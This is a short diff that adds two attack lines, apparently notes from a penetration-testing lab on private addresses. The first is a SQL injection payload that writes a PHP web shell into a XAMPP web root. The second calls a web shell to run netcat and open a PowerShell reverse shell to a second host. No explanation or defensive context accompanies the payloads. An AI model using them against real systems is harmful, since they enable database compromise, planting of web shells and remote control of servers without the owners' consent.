@@ -1,0 +1,6 @@
+192.168.117.1/index.php?userid=1 ' union select '',"<?php echo shell_exec($_GET['c']);?>",'','' into outfile 'C:\\xampp\\htdocs\\shell.php' -- -
+
+
+http://192.168.117.1/shell2.php?c=.\nc64.exe%20192.168.117.129%201234%20-e%20powershell
+
+
